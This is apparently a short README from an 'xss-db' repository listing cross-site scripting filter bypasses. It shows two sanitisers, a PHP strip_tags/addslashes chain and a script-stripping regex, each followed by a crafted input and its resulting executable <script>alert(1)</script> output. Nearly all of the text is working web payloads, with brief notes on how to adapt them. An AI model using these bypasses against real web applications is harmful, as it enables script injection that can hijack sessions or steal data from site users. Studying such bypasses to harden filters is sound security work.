# xss-db

PHP


PHP sorce code:
```PHP
addslashes(strip_tags(html_entity_decode("input")))
```
bypass:
```html
'<p>&lt;script&gt;/*&lt;</p>*/alert(1);/*<p>&gt;*/&lt;/script&gt;</p>'
```
output:
```html
<script>/*<*/alert(1);/*>*/</script>
```
notes:
 - may need to be escaped before hand
 - may also beable to be minified

<hr>

regex code:
```
#<script(.*?)>(.*?)</script>#is
```
bypass:
```html
<script>alert(1)</script/>
```
output:
```html
<script>alert(1)</script>
```
 notes:
  - might not be needed to be put here but I did anyways.

 <hr>
